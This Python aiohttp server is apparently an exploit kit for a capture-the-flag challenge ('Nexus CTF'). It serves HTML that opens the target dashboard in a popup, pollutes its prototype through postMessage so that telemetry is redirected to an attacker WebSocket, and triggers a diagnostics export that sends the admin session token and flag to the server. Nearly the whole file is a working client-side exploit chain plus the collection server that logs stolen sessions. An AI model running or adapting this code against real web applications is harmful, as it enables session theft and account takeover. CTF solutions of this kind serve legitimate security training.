#!/usr/bin/env python3
"""
Nexus CTF — All-in-one Render app
  - GET  /       → exploit HTML (served over HTTPS by Render)
  - GET  /log    → beacon logger
  - WS   /ws     → receives exfil diagnostics bundle with adminSession
"""

import os
import json
import asyncio
import logging
from aiohttp import web

logging.basicConfig(level=logging.INFO, format="%(asctime)s  %(message)s")
log = logging.getLogger("nexus")

TARGET = "http://34.118.127.209:35666/"

# ── Exploit HTML ────────────────────────────────────────────────────────
# Key insight: Render serves over HTTPS.
# - window.open('http://...') from HTTPS is allowed (top-level navigation)
# - iframe with http src from https IS blocked (mixed content)
# → we use ONLY window.open, no iframe
#
# Prototype pollution via JSON.parse ensures __proto__ is an own data
# property that survives structured clone through postMessage.

EXPLOIT_HTML = r"""<!DOCTYPE html>
<html><head><title>x</title></head>
<body>
<script>
(function(){
  var T = '__TARGET__';
  var W = '__WS_URL__';

  function L(m){
    try{ new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now(); }catch(e){}
  }

  L('page_loaded');

  /* 1. open dashboard in a popup (HTTPS→HTTP: allowed for top-level nav) */
  var pop = null;
  try {
    pop = window.open(T);
    L('popup=' + (pop ? 'ok' : 'null'));
  } catch(e){ L('popup_err=' + e.message); }

  /* 2. prototype-pollution payload via JSON.parse (__proto__ = own data prop) */
  function pollute(w) {
    try {
      var inner = JSON.parse(
        '{"__proto__":{"telemetryConsent":true,' +
        '"channelMode":"ws",' +
        '"realtimeEndpoint":"' + W + '"}}'
      );
      w.postMessage({type:'prefs:update', payload:{theme: inner}}, '*');
      L('pollute_sent');
    } catch(e){ L('pollute_err=' + e.message); }
  }

  /* 3. trigger diagnostics:export → WS exfil of adminSession */
  function trigger(w) {
    try {
      w.postMessage({type:'diagnostics:export'}, '*');
      L('trigger_sent');
    } catch(e){ L('trigger_err=' + e.message); }
  }

  /* fire one round at the popup */
  function round() {
    if (!pop || pop.closed) { L('pop_gone'); return; }
    try { L('pop.length=' + pop.length); } catch(e){ L('pop.length=err'); }
    pollute(pop);
    setTimeout(function(){ trigger(pop); }, 600);
  }

  /* multiple rounds to handle variable load times */
  var times = [1500, 3000, 5000, 7000, 10000, 14000];
  times.forEach(function(d){ setTimeout(round, d); });
})();
</script>
</body></html>
"""


def build_html(ws_url):
    return EXPLOIT_HTML.replace("__TARGET__", TARGET).replace("__WS_URL__", ws_url)


# ── Routes ──────────────────────────────────────────────────────────────
async def handle_index(request):
    host = request.headers.get("Host", request.host)
    ws_url = f"wss://{host}/ws"
    html = build_html(ws_url)
    return web.Response(text=html, content_type="text/html")


async def handle_log(request):
    qs = request.query_string
    log.info(f"[beacon] {qs}")
    return web.Response(status=204)


async def handle_ws(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    peer = request.remote
    log.info(f"[ws] connection from {peer}")

    async for msg in ws:
        if msg.type == web.WSMsgType.TEXT:
            print("\n" + "=" * 62)
            print("  EXFILTRATED DIAGNOSTICS BUNDLE")
            print("=" * 62)
            try:
                d = json.loads(msg.data)
                print(json.dumps(d, indent=2))
                s = d.get("session") or {}
                if s:
                    print(f"\n  >>> FLAG  = {s.get('flag', '???')}")
                    print(f"  >>> TOKEN = {s.get('token', '???')}")
            except Exception:
                print(msg.data[:2000])
            print("=" * 62 + "\n")
        elif msg.type == web.WSMsgType.ERROR:
            log.error(f"[ws] error: {ws.exception()}")

    log.info(f"[ws] closed ({peer})")
    return ws


# ── App ─────────────────────────────────────────────────────────────────
app = web.Application()
app.router.add_get("/", handle_index)
app.router.add_get("/log", handle_log)
app.router.add_get("/ws", handle_ws)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    log.info(f"Starting on :{port}")
    web.run_app(app, host="0.0.0.0", port=port)
